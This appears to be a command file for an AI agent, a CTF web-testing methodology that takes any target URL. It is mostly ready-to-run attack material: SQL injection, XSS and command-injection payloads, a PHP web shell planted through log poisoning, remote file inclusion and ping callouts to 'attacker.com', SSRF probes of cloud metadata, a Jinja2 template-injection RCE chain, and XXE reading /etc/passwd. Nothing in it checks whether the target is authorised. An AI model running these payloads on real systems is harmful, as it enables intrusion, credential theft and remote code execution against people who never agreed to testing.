---
description: "Comprehensive web application security testing for CTF challenges"
---

# CTF Web Application Testing

Systematic web app testing methodology with creative techniques.

## Phase 1: Information Gathering

### Technology Detection
```bash
whatweb $TARGET
wappalyzer $TARGET
```

### Directory & File Discovery
```bash
# Common files
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$TARGET/FUZZ

# Backup files
ffuf -w backup-files.txt -u http://$TARGET/FUZZ
# Try: .bak, .old, .backup, .zip, .tar.gz, ~, .swp

# Hidden directories
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$TARGET/FUZZ

# Check manually:
curl http://$TARGET/robots.txt
curl http://$TARGET/sitemap.xml
curl http://$TARGET/.git/config
curl http://$TARGET/.env
```

### Subdomain/Vhost Discovery
```bash
ffuf -w subdomains.txt -u http://$TARGET -H "Host: FUZZ.$DOMAIN"
```

## Phase 2: Vulnerability Testing

### SQL Injection
```bash
# Manual tests
' OR 1=1-- -
" OR 1=1-- -
1' ORDER BY 10-- -
1' UNION SELECT NULL,NULL,NULL-- -

# Automated
sqlmap -u "http://$TARGET/page.php?id=1" --batch --dbs

# Advanced
sqlmap -u "http://$TARGET/login" --data="user=admin&pass=admin" --batch --level=5 --risk=3
```

### XSS (Cross-Site Scripting)
```javascript
// Basic tests
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>

// Advanced
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### Command Injection
```bash
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)

# Blind
; sleep 10
| ping -c 10 attacker.com
```

### File Inclusion (LFI/RFI)
```bash
# LFI
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php

# Log poisoning
?file=../../../../var/log/apache2/access.log
# Inject: <?php system($_GET['cmd']); ?>

# RFI
?file=http://attacker.com/shell.txt
```

### SSRF (Server-Side Request Forgery)
```bash
# Test internal services
http://localhost
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://internal-service:8080

# Bypass filters
http://127.1
http://0177.0.0.1 (octal)
http://[::1]
```

### Template Injection (SSTI)
```python
# Detection
{{7*7}}
${7*7}
<%= 7*7 %>

# Exploitation (Jinja2)
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE
{{''.__class__.__mro__[1].__subclasses__()[400]('whoami',shell=True,stdout=-1).communicate()}}
```

### XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Deserialization
```python
# Check for pickles, Java objects, PHP serialize
# Search: "[technology] deserialization exploit"
```

## Phase 3: Authentication & Authorization

### Authentication Bypass
```bash
# SQL injection in login
admin' OR '1'='1'-- -

# Type juggling (PHP)
{"user":"admin","pass":true}

# Timing attacks on OTP/2FA
```

### Session Management
```bash
# Weak session tokens
# Session fixation
# Cookie manipulation
# JWT vulnerabilities (none algorithm, weak secret)
```

### Authorization
```bash
# IDOR (Insecure Direct Object Reference)
/user/1 → /user/2

# Path traversal
/download?file=../../etc/passwd

# Forced browsing
/admin, /dashboard, /config
```

## Phase 4: Advanced Techniques

### Race Conditions
```python
# Simultaneous requests
import requests
import threading

def exploit():
    requests.post(url, data=payload)

threads = [threading.Thread(target=exploit) for _ in range(10)]
[t.start() for t in threads]
```

### GraphQL Exploitation
```graphql
# Introspection
{__schema{types{name,fields{name}}}}

# Query all data
{users{id,password,email}}
```

### API Testing
```bash
# Fuzzing endpoints
ffuf -w api-endpoints.txt -u http://$TARGET/api/FUZZ

# Test HTTP methods
curl -X PUT
curl -X DELETE
curl -X PATCH
```

## Phase 5: Web Search Integration

For each finding, search:
- "[vulnerability_type] ctf writeup"
- "[technology] [vulnerability] exploit"
- "[error_message] bypass technique"

## Output Format

Structured report:
1. **Vulnerabilities Found** (prioritized by severity)
2. **Exploitation Steps** (detailed commands)
3. **Expected Results** (what should happen)
4. **Next Steps** (if exploitation fails)

**Usage**: `/ctf-web [target_url]`
